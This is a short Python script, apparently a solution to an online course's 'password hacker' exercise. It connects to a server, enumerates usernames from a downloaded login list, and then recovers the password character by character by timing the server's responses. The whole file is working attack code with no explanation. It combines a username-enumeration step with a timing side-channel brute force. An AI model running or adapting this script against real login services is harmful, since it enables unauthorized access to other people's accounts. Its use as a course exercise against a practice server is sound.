import socket, sys, json, string, requests
from datetime import datetime

ip, port = sys.argv[1], int(sys.argv[2])
s = socket.socket()
s.connect((ip, port))

logins = requests.get('https://stepik.org/media/attachments/lesson/255258/logins.txt')

for login in ''.join(logins.text).split('\r\n'):
    data = json.dumps({"login": login, "password": " "})
    s.sendall(bytes(data, encoding='utf8'))
    response = json.loads(s.recv(1024).decode())

    if response['result'] == 'Wrong password!':
        break

alph = list(string.ascii_lowercase + string.ascii_uppercase + '0123456789')
pswd = ''
i = 0
while True:
    data = json.dumps({"login": login, "password": pswd + alph[i]})

    s.sendall(bytes(data, encoding='utf8'))
    start = datetime.now()
    response = json.loads(s.recv(1024).decode())
    final = datetime.now()
    if (final - start).microseconds >= 90000:
        pswd += alph[i]
        i = 0
        continue
    elif response['result'] == 'Connection success!':
        print(data)
        exit()
    else:
        i += 1
